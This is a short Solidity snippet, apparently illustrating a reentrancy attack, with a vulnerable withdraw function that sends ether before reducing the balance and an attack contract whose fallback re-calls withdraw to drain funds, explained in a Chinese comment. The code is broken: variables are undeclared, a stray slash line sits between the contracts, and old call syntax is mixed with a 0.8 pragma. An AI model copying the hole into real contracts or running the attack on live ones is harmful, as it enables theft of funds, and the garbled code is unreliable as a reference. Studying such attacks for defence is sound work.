// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Reentrance {
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount; // update balance after send
    }
  }
}
/
contract Attack {
  function() public payable {
    uint weHave = c.balanceOf(this);
    if (weHave > c.balance) {
      if (c.balance != 0) c.withdraw(c.balance);
      return;
    }
    // 这里是fallback（）函数，攻击合约在fallback函数中接收以太币时再次调用withdraw，则可以在更新余额之前无限递归调用withdraw
    c.withdraw(weHave);
  }
}